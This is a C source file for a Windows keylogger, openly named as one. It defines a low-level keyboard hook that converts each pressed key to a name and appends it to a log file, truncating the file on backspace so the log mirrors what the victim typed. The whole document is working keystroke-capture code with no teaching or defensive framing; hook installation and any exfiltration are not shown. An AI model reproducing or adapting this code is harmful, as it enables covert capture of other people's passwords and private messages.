#include "keylogger.h"

FILE *file = NULL;

const char *get_key_name(DWORD vkCode)
{
    static char key_name[32];
    switch (vkCode)
    {
    case VK_BACK:
        return "[BACKSPACE]";
    case VK_TAB:
        return "[TAB]";
    case VK_RETURN:
        return "[ENTER]";
    case VK_SHIFT:
        return "[SHIFT]";
    case VK_CONTROL:
        return "[CTRL]";
    case VK_MENU:
        return "[ALT]";
    case VK_CAPITAL:
        return "[CAPSLOCK]";
    case VK_ESCAPE:
        return "[ESC]";
    case VK_SPACE:
        return " ";
    case VK_LEFT:
        return "[LEFT]";
    case VK_UP:
        return "[UP]";
    case VK_RIGHT:
        return "[RIGHT]";
    case VK_DOWN:
        return "[DOWN]";
    default:
        if (vkCode >= 0x30 && vkCode <= 0x39)
        {
            snprintf(key_name, sizeof(key_name), "%c", (char)vkCode);
        }
        else if (vkCode >= 0x41 && vkCode <= 0x5A)
        {
            snprintf(key_name, sizeof(key_name), "%c", (char)vkCode);
        }
        else
        {
            snprintf(key_name, sizeof(key_name), "[UNKNOWN: %lu]", vkCode);
        }
        return key_name;
    }
}

void remove_last_char_from_file()
{
    if (file != NULL)
    {
        long file_size;
        fseek(file, 0, SEEK_END);
        file_size = ftell(file);
        if (file_size > 0)
        {
            fseek(file, -1, SEEK_END);
            ftruncate(fileno(file), file_size - 1);
        }
    }
}

LRESULT CALLBACK hook_proc(int code, WPARAM wparam, LPARAM lparam)
{
    if (code == HC_ACTION && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lparam;
        if (file != NULL)
        {
            const char *key_name = get_key_name(kb->vkCode);
            if (key_name == "[BACKSPACE]")
            {
                remove_last_char_from_file();
            }
            else
            {
                fprintf(file, "%s", key_name);
                fflush(file);
            }
        }
        return CallNextHookEx(NULL, code, wparam, lparam);
    }
    return CallNextHookEx(NULL, code, wparam, lparam);
}